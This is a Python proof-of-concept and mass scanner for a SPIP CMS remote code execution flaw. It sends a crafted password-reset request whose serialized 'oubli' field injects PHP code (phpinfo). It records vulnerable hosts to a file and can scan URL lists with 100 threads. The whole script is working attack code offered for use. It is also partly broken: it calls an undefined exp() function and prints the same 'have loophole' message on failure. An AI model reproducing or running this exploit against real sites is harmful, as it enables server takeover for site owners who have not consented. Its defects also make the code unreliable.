#SPIP CMS远程代码执行漏洞poc
import requests,sys,argparse,re,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """


███████╗██████╗ ██╗██████╗        ██████╗███╗   ███╗███████╗
██╔════╝██╔══██╗██║██╔══██╗      ██╔════╝████╗ ████║██╔════╝
███████╗██████╔╝██║██████╔╝█████╗██║     ██╔████╔██║███████╗
╚════██║██╔═══╝ ██║██╔═══╝ ╚════╝██║     ██║╚██╔╝██║╚════██║
███████║██║     ██║██║           ╚██████╗██║ ╚═╝ ██║███████║
╚══════╝╚═╝     ╚═╝╚═╝            ╚═════╝╚═╝     ╚═╝╚══════╝
                                                            

"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="This is SPIP CMS Remote Code Execution Vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url_payload = '/spip/spip.php?page=spip_pass'
    headers = {
        'user-agent':'mozilla/4.0 (mozilla/4.0; Msie 7.0; windoWS nt 5.1; fdM; sv1; .nET clr 3.0.04506.30)',
        'accept-encoding':'gzip, deflate',
        'accept':'*/*',
        'connection':'close',
        'cookie':'cIbcinit=oui',
        'content-length':'215',
        'content-type':'application/x-www-form-urlencoded',
    }
    data = 'page=spip_pass&formulaire_action=oubli&formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&oubli=s:19:"<?php phpinfo(); ?>";&nobot='
    try:
        res1 = requests.post(url=target+url_payload,headers=headers,data=data,verify=False,timeout=5)
        if 200 == res1.status_code and 'PHP Extension' in res1.text and 'PHP Version' in res1.text and '<!DOCTYPE html' in res1.text:
            print(f"[+]{target} have loophole “{target+url_payload}”")
            with open ('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target} have loophole")
    except:
        pass
if __name__ == '__main__':
    main()